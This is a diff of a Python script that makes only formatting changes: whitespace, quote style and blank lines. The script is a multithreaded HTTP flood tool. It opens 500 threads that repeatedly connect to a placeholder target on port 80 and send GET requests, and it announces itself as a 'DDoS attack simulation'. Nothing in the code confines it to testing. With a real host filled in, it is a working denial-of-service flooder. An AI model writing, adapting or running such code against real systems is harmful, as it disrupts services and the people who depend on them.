@@ -30,24 +30,26 @@ import sys
         - This function is designed to run in a separate thread
     """
 
-target = "target_host"  # Replace with the actual target host       
+target = "target_host"  # Replace with the actual target host
 port = 80
 fake_ip = "fake_ip_address"  # Replace with a spoofed IP address
 num_threads = 500
 attack_event = threading.Event()
 
+
 def attack():
-    
+
     while not attack_event.is_set():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target, port))
-            request = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n".encode('utf-8')
+            request = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n".encode("utf-8")
             s.send(request)
             s.close()
-            time.sleep(0.01) 
+            time.sleep(0.01)
         except Exception as e:
             print(f"Error: {e}")
+
 
 def start_attack():
     threads = []
@@ -56,6 +58,7 @@ def start_attack():
         thread.start()
         threads.append(thread)
     return threads
+
 
 if __name__ == "__main__":
     print("Starting DDoS attack simulation...")
